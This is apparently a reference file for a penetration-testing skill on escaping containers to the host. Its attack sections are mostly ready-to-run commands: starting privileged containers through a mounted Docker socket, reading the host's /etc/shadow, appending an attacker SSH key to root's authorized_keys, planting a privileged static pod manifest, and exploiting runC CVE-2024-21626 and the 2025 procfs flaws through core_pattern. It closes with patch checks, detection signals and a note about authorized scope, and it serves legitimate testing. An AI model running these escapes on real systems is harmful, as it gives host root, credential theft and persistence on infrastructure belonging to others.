# escaping-containers-to-host — 详细参考（由 SKILL.md 拆分）

### Step 3: Escape via a Mounted Docker Socket

If `/var/run/docker.sock` is bind-mounted into the container, you control the host Docker daemon and can launch a new container that mounts the host root.

```bash
# Confirm reachability
docker -H unix:///var/run/docker.sock version 2>/dev/null || \
  curl -s --unix-socket /var/run/docker.sock http://localhost/version

# Launch a privileged container mounting host / and chroot into it
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged --net=host --pid=host \
  -v /:/host alpine chroot /host sh

# Pure-curl variant (no docker CLI in container):
curl -s -XPOST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],
       "Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create?name=esc
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/esc/start
```

### Step 4: Escape via a hostPath Mount (Kubernetes)

A pod with a `hostPath` volume of `/` (or a sensitive host dir) lets you read/write host files directly — e.g., drop a root SSH key or a privileged static pod manifest.

```bash
# If /host is the hostPath mount of node root:
ls /host
# Persist: add an attacker key for node root login
mkdir -p /host/root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /host/root/.ssh/authorized_keys

# Or write a privileged static pod manifest that kubelet will auto-run as root
cat > /host/etc/kubernetes/manifests/pwn.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata: {name: pwn, namespace: kube-system}
spec:
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: {privileged: true}
    volumeMounts: [{name: host, mountPath: /host}]
  volumes: [{name: host, hostPath: {path: /}}]
EOF
```

### Step 5: Exploit runC CVE-2024-21626 (Leaky Vessels fd leak)

If the runtime is runC <= 1.1.11, the leaked host-cwd fd can be used. With `docker build`/`docker run` control, set the working directory to `/proc/self/fd/<N>` (commonly 7 or 8).

```bash
# Detect vulnerable runtime version (host or via runc binary in image)
runc --version          # vulnerable: 1.0.0-rc93 .. 1.1.11
docker info --format '{{.DefaultRuntime}}'

# Proof-of-concept via a malicious image WORKDIR (run-time variant)
cat > Dockerfile <<'EOF'
FROM alpine
# fd 7/8 leaked by runc references the HOST cwd before pivot_root
WORKDIR /proc/self/fd/8
RUN ["/bin/sh","-c","cd ../../../../ ; cat etc/shadow ; cat etc/hostname"]
EOF
docker build --no-cache -t leaky .

# Run-time variant: the container lands in a host directory
docker run --rm --workdir /proc/self/fd/8 alpine \
  sh -c 'cd ../../../.. && cat etc/shadow'
# Reference PoC: github.com/strikoder/cve-2024-21626-runc-1.1.11-escape
```

### Step 6: Exploit the 2025 runC procfs Write-Redirect Family

For runC <= 1.2.7 / 1.3.2 / 1.4.0-rc.2, CVE-2025-31133/52565/52881 abuse a race between the `/dev/null`/`/dev/console` bind mount and the application of `maskedPaths`, replacing the mount target with a symlink so a host `/proc` entry becomes writable. Writing `core_pattern` or `/proc/sysrq-trigger` yields host code execution.

```bash
# Confirm vulnerable runtime
runc --version   # vulnerable: <= 1.2.7, 1.3.2, 1.4.0-rc.2

# Conceptual exploitation flow (use maintainers' PoC in a lab):
#  1. Start a container that, during init, swaps the /dev/console (or a
#     custom device) bind-mount target for a symlink to /proc/sysrq-trigger.
#  2. Win the race so runc bind-mounts it read-write before maskedPaths apply.
#  3. Redirect a write to host procfs:
echo c > /proc/sysrq-trigger     # would crash host (DoS) - demonstrates RW
#  4. For code exec, redirect the write to /proc/sys/kernel/core_pattern:
echo '|/bin/sh -c "id>/host_pwn"' > /proc/sys/kernel/core_pattern
#     then trigger a core dump in any host-visible process.
# Advisories: GHSA-cgrx-mc8f-2prm, GHSA-9493-h29p-rfm2
```

### Step 7: Validate the Patched State and Document Remediation

```bash
# Verify runtimes are patched
runc --version              # want >= 1.2.8 / 1.3.3 / 1.4.0-rc.3 (and != vuln 1.1.x)
docker version --format '{{.Server.Version}}'   # >= 25.0.2 for CVE-2024-21626
containerd --version        # >= 1.6.28 / 1.7.13

# Confirm hardening for misconfig escapes
docker inspect <ctr> --format '{{.HostConfig.Privileged}}'   # want false
kubectl get pod <pod> -o jsonpath='{.spec.containers[*].securityContext}'
```

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| amicontained | Capability/namespace/seccomp introspection | https://github.com/genuinetools/amicontained |
| deepce | Docker enumeration & escape automation | https://github.com/stealthcopter/deepce |
| CDK | Container/K8s penetration toolkit | https://github.com/cdk-team/CDK |
| runc PoC (CVE-2024-21626) | Leaky Vessels reference exploit | https://github.com/strikoder/cve-2024-21626-runc-1.1.11-escape |
| Sysdig runc 2025 advisory | CVE-2025-31133/52565/52881 analysis | https://www.sysdig.com/blog/runc-container-escape-vulnerabilities |
| Palo Alto Leaky Vessels | CVE-2024-21626 deep dive | https://www.paloaltonetworks.com/blog/cloud-security/leaky-vessels-vulnerabilities-container-escape/ |

## Escape Primitive Reference

| Primitive | Root Cause | Detection Signal |
|-----------|-----------|------------------|
| Privileged container | `--privileged` / `CAP_SYS_ADMIN` | `mount` of cgroup, write to `release_agent` |
| Docker socket mount | `/var/run/docker.sock` bind-mounted | Daemon API call from a container |
| hostPath `/` mount | Pod mounts node root | Write to `/host/etc/kubernetes/manifests` |
| CVE-2024-21626 | runC fd leak before pivot_root | WORKDIR/cwd `=/proc/self/fd/N` |
| CVE-2025-31133/52565/52881 | procfs write redirect via mount race | RW mount of `/dev/console`, write to `/proc/sysrq-trigger` |

## Validation Criteria

- [ ] Container privilege posture enumerated (caps, namespaces, mounts, seccomp)
- [ ] Available escape primitive correctly identified
- [ ] Host-level code execution demonstrated (host hostname / `/etc/shadow` / host file write captured)
- [ ] Root-cause misconfiguration or vulnerable runtime version recorded
- [ ] runC/containerd/Docker versions checked against CVE patch baselines
- [ ] Remediation guidance (drop privileges, remove socket mount, patch runtime) documented
- [ ] All actions stayed within the authorized scope
